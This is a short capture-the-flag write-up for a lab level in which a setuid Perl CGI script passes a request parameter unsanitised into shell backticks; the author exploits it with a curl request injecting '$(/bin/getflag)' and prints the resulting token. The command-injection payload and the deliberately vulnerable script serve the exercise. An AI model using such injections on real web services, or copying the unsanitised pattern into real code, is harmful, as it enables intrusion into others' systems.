# Level04

## Solution

We have a Perl file in the home directory belonging to flag04, which can therefore execute getflag.

```
$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

We have quite a few hints when we do a cat on the file: the address where the request is made is marked in the comments, and we can see that it uses the parameter x.

```
$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Here we can see that echo is executed correctly with our parameter.

```
$ curl 'localhost:4747/level04.pl?x=test'
test
```

Just do it with getflag

```
$ curl 'localhost:4747/level04.pl?x=$(/bin/getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
